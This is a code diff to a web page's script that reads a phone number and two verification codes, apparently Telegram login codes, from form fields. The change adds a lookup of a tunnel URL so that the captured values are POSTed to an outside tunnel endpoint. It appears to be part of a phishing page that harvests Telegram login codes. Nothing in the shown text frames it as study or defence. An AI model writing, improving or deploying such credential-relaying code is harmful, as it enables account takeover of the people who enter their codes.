@@ -161,22 +161,34 @@ document.getElementById('code_telegram').addEventListener('input', function(even
   }
 });
 
+let baseUrl = 'http://localhost:4040';
+
+fetch('/tunnel-url')
+  .then(res => res.json())
+  .then(data => {
+    if (data.url) {
+      baseUrl = data.url;
+      console.log('[+] Base URL atualizada:', baseUrl);
+    }
+  })
+  .catch(err => console.error('Erro ao buscar URL do túnel:', err));
 
 document.querySelector('.next').addEventListener('click', () => {
-const number_ver = document.getElementById('number').value;
-const code_ver = document.getElementById('code').value;
-const code_telegram_ver = document.getElementById('code_telegram').value;
-    fetch('http://localhost:4040/data', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          number: number_ver,
-          code: code_telegram_ver,
-         telegram: code_ver           
-            //url: window.location.href
-        })
-    }).catch(err => console.error('Erro to send log:', err));
+  const number_ver = document.getElementById('number').value;
+  const code_ver = document.getElementById('code').value;
+  const code_telegram_ver = document.getElementById('code_telegram').value;
+
+  fetch(`${baseUrl}/data`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      number: number_ver,
+      code: code_telegram_ver,
+      telegram: code_ver
+    })
+  }).catch(err => console.error('Erro ao enviar dados:', err));
 });
+
 </script>
 
 </div>
